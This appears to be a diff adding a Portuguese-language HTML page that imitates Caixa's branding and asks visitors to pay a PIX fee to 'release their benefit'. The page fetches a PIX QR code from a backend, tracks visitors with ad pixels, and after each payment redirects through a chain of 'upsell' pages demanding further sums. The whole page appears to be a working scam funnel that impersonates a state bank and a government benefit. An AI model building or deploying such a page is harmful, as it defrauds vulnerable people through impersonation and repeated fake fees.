@@ -1,0 +1,604 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="utf-8">
+<script>
+  window.pixelId = "67ef67b0655738af4b8dbdd8";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+<!-- Meta Pixel Code -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '2853456888176959');
+fbq('track', 'PageView');
+</script>
+<noscript><img height="1" width="1" style="display:none"
+src="https://www.facebook.com/tr?id=2853456888176959&ev=PageView&noscript=1"
+/></noscript>
+<!-- End Meta Pixel Code -->
+<script
+  src="https://otimizey-cdn.s3.us-east-1.amazonaws.com/scripts-utm-otimizey.js"
+  async
+  defer
+></script>;
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Caixa | Pagamento PIX</title>
+    <link rel="shortcut icon" href="public/assets/images/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="../style.css">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script
+    src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+    data-utmify-prevent-subids
+    data-utmify-ignore-iframe
+    async
+    defer
+  ></script>
+  <script>
+    window.pixelId = "68312b2ad323906a4dbab27f";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+    <script>
+        tailwind.config = {
+            theme: {
+                extend: {
+                    colors: {
+                        'primary': '#005CA9', // Cor primária Caixa
+                        'secondary': '#F39200', // Laranja Caixa
+                        'dark': '#333333', // Cor escura para textos
+                        'light': '#FFFFFF' // Cor clara para fundos
+                    },
+                    fontFamily: {
+                        'sans': ['FuturaBold', 'Arial', 'Helvetica', 'sans-serif']
+                    }
+                }
+            }
+        }
+    </script>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap');
+        
+        @font-face {
+          font-family: 'FuturaBold';
+          src: url('../fonts/futuraBold.eot');
+          src: url('../fonts/futuraBold.eot#iefix') format('embedded-opentype'),
+               url('../fonts/futuraBold.woff') format('woff'),
+               url('../fonts/futuraBold.ttf') format('truetype'),
+               url('../fonts/futuraBold.svg#futuraBold') format('svg');
+          font-weight: bold;
+          font-style: normal;
+        }
+        
+        * {
+            font-family: 'Montserrat', Arial, Helvetica, sans-serif !important;
+        }
+        
+        .title-bold, h1, h2, h3, .valor-aprovado, button {
+            font-family: 'FuturaBold', 'Montserrat', Arial, sans-serif !important;
+        }
+        
+        body {
+            font-family: 'Montserrat', Arial, Helvetica, sans-serif;
+            background-color: #F8F8F8;
+            color: #333;
+            overflow-x: hidden;
+            width: 100%;
+            position: relative;
+            margin: 0;
+            padding: 0;
+        }
+        
+        html {
+            overflow-x: hidden;
+            width: 100%;
+        }
+        
+        .govbr-container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+        
+        /* Estilo para o header no estilo Caixa */
+        header {
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            background-color: #005CA9;
+            padding: 0;
+            overflow: hidden;
+            position: relative;
+        }
+        
+        header img {
+            width: 110px;
+            margin: 10px;
+            height: auto;
+        }
+        
+        /* Botões estilo Caixa */
+        .govbr-button {
+            background-color: #005CA9;
+            transition: all 0.3s ease;
+            color: white;
+            font-weight: 600;
+            border: none;
+            border-radius: 8px;
+            padding: 12px 16px;
+            text-transform: uppercase;
+            font-size: 14px;
+            letter-spacing: 0.5px;
+            box-shadow: 0 2px 4px rgba(0, 92, 169, 0.3);
+        }
+        
+        .govbr-button:hover {
+            background-color: #004a87;
+            transform: translateY(-2px);
+            box-shadow: 0 4px 8px rgba(0, 92, 169, 0.4);
+        }
+        
+        .govbr-outline-button {
+            border: 2px solid #005CA9;
+            color: #005CA9;
+            transition: all 0.3s ease;
+            border-radius: 8px;
+        }
+        
+        .govbr-outline-button:hover {
+            background-color: #005CA9;
+            color: white;
+        }
+        
+        .govbr-card {
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        }
+        
+        .govbr-input {
+            border: 2px solid #DDDDDD;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 16px;
+            width: 100%;
+            background-color: #F8F8F8;
+        }
+        
+        .govbr-input:disabled {
+            background-color: #EFEFEF;
+            color: #555;
+        }
+        
+        .govbr-badge {
+            background-color: #005CA9;
+            color: white;
+            padding: 4px 12px;
+            border-radius: 16px;
+            font-weight: 500;
+            font-size: 14px;
+        }
+        
+        .govbr-timer {
+            color: #FF3333;
+            font-weight: bold;
+        }
+        
+        .govbr-loading {
+            border-top-color: #005CA9;
+        }
+        
+        .govbr-success-icon {
+            color: #005CA9;
+        }
+        
+        .pulse-animation {
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% {
+                transform: scale(1);
+            }
+            50% {
+                transform: scale(1.05);
+            }
+            100% {
+                transform: scale(1);
+            }
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.5s ease-in;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+        
+        .valor-aprovado-container {
+            background-color: #F8F8F8;
+            border-left: 4px solid #005CA9;
+            padding: 12px;
+            margin: 16px 0;
+            text-align: left;
+        }
+        
+        .valor-aprovado-label {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 4px;
+            font-weight: 500;
+        }
+        
+        .valor-aprovado {
+            color: #005CA9;
+            font-size: 28px;
+            font-weight: bold;
+            display: block;
+        }
+
+        /* Adiciona estilos para o popup de notificação */
+        .notification-popup {
+            position: fixed;
+            top: 20px;
+            right: -300px;
+            background-color: #005CA9;
+            color: white;
+            padding: 16px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            z-index: 1000;
+            transition: right 0.3s ease-in-out;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .notification-popup.show {
+            right: 20px;
+        }
+        
+        /* Estilo Caixa para os cards */
+        .bg-white {
+            border-radius: 8px;
+        }
+        
+        /* Ajuste para cor de fundo no estilo Caixa */
+        .bg-yellow-500 {
+            background-color: #F39200 !important;
+        }
+        
+        /* Ajuste para cor de fundo da barra informativa */
+        .bg-blue-600 {
+            background-color: #005CA9 !important;
+        }
+        
+        /* Estilo Caixa para os containers */
+        .rounded-md {
+            border-radius: 8px;
+        }
+        
+        /* Ajuste para cor verde de confirmação */
+        .bg-green-600 {
+            background-color: #005CA9 !important;
+        }
+        
+        .text-green-600 {
+            color: #005CA9 !important;
+        }
+        
+        /* Loading page com cores da Caixa */
+        #loadingPage {
+            background-color: rgba(66, 145, 219, 0.95) !important;
+        }
+        
+        /* Adiciona uma barra superior no estilo da Caixa */
+        .caixa-topbar {
+            height: 5px;
+            background: linear-gradient(to right, #005CA9 70%, #F39200 30%);
+            width: 100%;
+        }
+    </style>
+</head>
+
+<body class="min-h-screen">
+    <div class="caixa-topbar"></div>
+    <noscript>
+		<img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=9432167203543880&ev=PageView&noscript=1"/>
+	</noscript>
+	
+    <div id="notification" class="notification-popup">
+        <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M5 13l4 4L19 7" />
+        </svg>
+        <span>Código PIX copiado!</span>
+    </div>
+
+    <!-- Header da Caixa -->
+    <header class="bg-white px-4 shadow-md">
+        <div class="max-w-[1200px] mx-auto flex items-center gap-6">
+            <img alt="Logo Caixa" width="1920" height="1080" class="w-auto h-12" style="color:transparent" src="../images/logo-caixa.png">
+        </div>
+    </header>
+
+    <div id="loadingPage" class="fixed inset-0 w-full h-full z-50 flex items-center justify-center hidden fade-in">
+        <div class="flex flex-col items-center justify-center">
+            <div class="relative w-40 h-40 mb-8">
+                <!-- Logo com efeito de pulsação -->
+                <img src="../images/logo-caixa.png" alt="Logo Caixa" class="w-32 absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 z-10 animate-pulse">
+                
+                <!-- Anel de carregamento animado -->
+                <svg class="w-40 h-40 absolute top-0 left-0" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+                    <circle cx="50" cy="50" r="45" fill="none" stroke="rgba(255, 255, 255, 0.2)" stroke-width="6"/>
+                    <circle cx="50" cy="50" r="45" fill="none" stroke="white" stroke-width="6" stroke-linecap="round" stroke-dasharray="283" stroke-dashoffset="100">
+                        <animateTransform attributeName="transform" type="rotate" from="0 50 50" to="360 50 50" dur="2s" repeatCount="indefinite"/>
+                    </circle>
+                </svg>
+            </div>
+            
+            <div class="text-center text-white">
+                <h1 class="text-2xl font-bold mb-3">
+                    Preparando seu pagamento
+                </h1>
+                <p id="loadingMessage" class="text-base opacity-90">
+                    Estamos gerando seu QR Code Pix...
+                </p>
+                
+                <!-- Indicador de pontos carregando -->
+                <div class="flex justify-center mt-4 space-x-1">
+                    <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 0s"></div>
+                    <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 0.2s"></div>
+                    <div class="w-2 h-2 bg-white rounded-full animate-bounce" style="animation-delay: 0.4s"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="mainPage" class="main-content fade-in">
+        <div class="govbr-container px-4 py-8">
+            <div class="govbr-card bg-white p-6 rounded-md shadow-md">
+                <h1 class="text-2xl font-bold text-dark mb-6">Pagamento via PIX</h1>
+                
+                <div class="valor-aprovado-container">
+                    <span class="valor-aprovado-label">Valor a pagar:</span>
+                    <span class="valor-aprovado" id="valorPagamento">Carregando...</span>
+                </div>
+
+                <div class="mt-6">
+                    <p class="text-sm text-gray-600 mb-4">
+                        Escaneie o QR Code ou copie o código PIX abaixo para realizar o pagamento.
+                    </p>
+
+                    <div class="flex flex-col items-center space-y-4">
+                        <div id="qrCodeContainer" class="bg-white p-4 rounded-lg shadow-sm border border-gray-200 hover:bg-gray-50 transition-colors cursor-pointer" onclick="copyPixCode()">
+                            <img id="qrCodeImage" src="" alt="QR Code PIX" class="w-48 h-48">
+                        </div>
+
+                        <div class="w-full">
+                            <label class="block text-sm font-medium text-gray-700 mb-2">
+                                Código PIX (Copiar e Colar)
+                            </label>
+                            <div class="flex">
+                                <input type="text" id="pixCode" class="govbr-input flex-1" readonly>
+                                <button onclick="copyPixCode()" class="govbr-button ml-2">
+                                    Copiar
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="mt-6">
+                        <div class="bg-blue-600 py-3 px-4 rounded-md text-white">
+                            <p class="text-base">
+                                <strong>IMPORTANTE:</strong> Efetue o pagamento via Pix dentro do prazo estipulado para que possamos <strong>liberar seu benefício sem atrasos</strong>.
+                            </p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function copyPixCode() {
+            const pixCode = document.getElementById('pixCode');
+            pixCode.select();
+            document.execCommand('copy');
+            
+            const notification = document.getElementById('notification');
+            notification.classList.add('show');
+            
+            setTimeout(() => {
+                notification.classList.remove('show');
+            }, 3000);
+        }
+
+        function formatarValor(valor) {
+            return new Intl.NumberFormat('pt-BR', {
+                style: 'currency',
+                currency: 'BRL'
+            }).format(valor / 100);
+        }
+
+        async function iniciarPagamento() {
+            document.getElementById('loadingPage').classList.remove('hidden');
+            document.getElementById('mainPage').classList.add('hidden');
+
+            // Pegar todos os parâmetros da URL
+            const urlParams = new URLSearchParams(window.location.search);
+            const params = {};
+            
+            // Pegar o valor do parâmetro 'valor' ou usar valor padrão
+            const valorPagamento = urlParams.get('valor') || '2790';
+            
+            // Adicionar o valor aos parâmetros
+            params.valor = valorPagamento;
+
+            // Adicionar todos os outros parâmetros da URL
+            for (const [key, value] of urlParams.entries()) {
+                if (key !== 'valor') { // Evita duplicar o valor
+                    params[key] = value;
+                }
+            }
+
+            // Recuperar parâmetros do Utmify
+            const utmifyParams = window.utmify ? window.utmify.getParameters() : {};
+            Object.assign(params, utmifyParams);
+
+            try {
+                const response = await fetch('pagamento.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded',
+                    },
+                    body: new URLSearchParams(params)
+                });
+
+                const data = await response.json();
+
+                if (data.success) {
+                    document.getElementById('valorPagamento').textContent = formatarValor(data.valor);
+                    document.getElementById('pixCode').value = data.pixCode;
+                    document.getElementById('qrCodeImage').src = data.qrCodeUrl;
+                    
+                    document.getElementById('loadingPage').classList.add('hidden');
+                    document.getElementById('mainPage').classList.remove('hidden');
+
+                    // Iniciar verificação de status
+                    verificarStatus(data.token);
+                } else {
+                    alert('Erro ao gerar pagamento: ' + data.message);
+                }
+            } catch (error) {
+                console.error('Erro:', error);
+                alert('Erro ao processar pagamento. Por favor, tente novamente.');
+            }
+        }
+
+        async function verificarStatus(token) {
+            try {
+                console.log('🔍 Verificando status do pagamento:', token);
+                const response = await fetch(`../checkout/verificar.php?id=${token}`);
+                const httpStatus = response.status;
+                console.log('📊 Status HTTP da resposta:', httpStatus);
+
+                const data = await response.json();
+                console.log('📦 Resposta completa do verificar.php:', data);
+
+                if (data.status === "PAID" || data.status === "APPROVED" || data.status === "paid" || data.status === "approved") {
+                    console.log('✅ Pagamento aprovado! Status:', data.status);
+                    
+                    // Pegar o referer ou parâmetro da URL para determinar o próximo upsell
+                    const urlParams = new URLSearchParams(window.location.search);
+                    const currentUpsell = urlParams.get('from_upsell') || '1'; // Se não especificado, assume upsell1
+                    console.log('🔄 Upsell atual:', currentUpsell);
+                    
+                    // Determinar próximo upsell e valor
+                    let nextUpsell;
+                    let nextValue;
+                    switch(currentUpsell) {
+                        case '1':
+                            nextUpsell = 'upsell6';
+                            nextValue = '2490';
+                            break;
+                        case '2':
+                            nextUpsell = 'upsell3';
+                            nextValue = '1790';
+                            break;
+                        case '3':
+                            nextUpsell = 'upsell4';
+                            nextValue = '2490';
+                            break;
+                        case '4':
+                            nextUpsell = 'upsell5';
+                            nextValue = '3980';
+                            break;
+                        case '5':
+                            nextUpsell = 'upsell1';
+                            nextValue = '3990';
+                            break;
+                        case '6':
+                            nextUpsell = 'upsell2';
+                            nextValue = '1970';
+                            break;
+                        default:
+                            nextUpsell = 'upsell2';
+                            nextValue = '1970';
+                    }
+                    console.log('➡️ Próximo upsell:', nextUpsell, 'com valor:', nextValue);
+
+                    // Criar objeto com os dados da transação
+                    const transactionData = {
+                        orderId: token,
+                        status: "APPROVED",
+                        amount: parseInt(urlParams.get('valor')),
+                        createdAt: new Date().toISOString(),
+                        approvedDate: new Date().toISOString(),
+                        customer: data.customer || {
+                            name: "Cliente",
+                            email: "cliente@email.com",
+                            cpf: "12345678909",
+                            phone: "11999999999"
+                        },
+                        fee: {
+                            fixedAmount: 0
+                        }
+                    };
+
+                    // Codificar os dados da transação em base64
+                    const transactionBase64 = btoa(JSON.stringify(transactionData));
+                    console.log('📝 Dados da transação:', transactionData);
+
+                    // Pegar parâmetros UTM da URL atual
+                    const utmParams = {};
+                    for (const [key, value] of urlParams.entries()) {
+                        if (key.startsWith('utm_') || ['src', 'sck', 'xcod', 'fbclid', 'gclid', 'ttclid'].includes(key)) {
+                            utmParams[key] = value;
+                        }
+                    }
+
+                    // Construir nova query string com parâmetros atualizados
+                    const newParams = new URLSearchParams({
+                        ...utmParams,
+                        from_upsell: nextUpsell === 'obrigado' ? '6' : String(parseInt(currentUpsell) + 1),
+                        valor: nextValue,
+                        transaction: transactionBase64
+                    });
+
+                    // Construir URL final
+                    const nextUrl = `/consulta/${nextUpsell}/index.html?${newParams.toString()}`;
+                    console.log('🔗 URL de redirecionamento:', nextUrl);
+
+                    // Redirecionar
+                    console.log('🚀 Redirecionando...');
+                    window.location.href = nextUrl;
+                } else if (data.status === 'pending' || data.status === 'PENDING' || data.status === 'waiting_payment') {
+                    console.log('⏳ Pagamento ainda pendente. Verificando novamente em 5 segundos...');
+                    setTimeout(() => verificarStatus(token), 12000);
+                } else {
+                    console.log('❌ Status desconhecido:', data.status);
+                    setTimeout(() => verificarStatus(token), 12000);
+                }
+            } catch (error) {
+                console.error('❌ Erro ao verificar status:', error);
+                console.log('🔄 Tentando novamente em 5 segundos...');
+                setTimeout(() => verificarStatus(token), 12000);
+            }
+        }
+
+        // Iniciar o processo quando a página carregar
+        window.addEventListener('load', iniciarPagamento);
+    </script>
+</body>
+</html> 
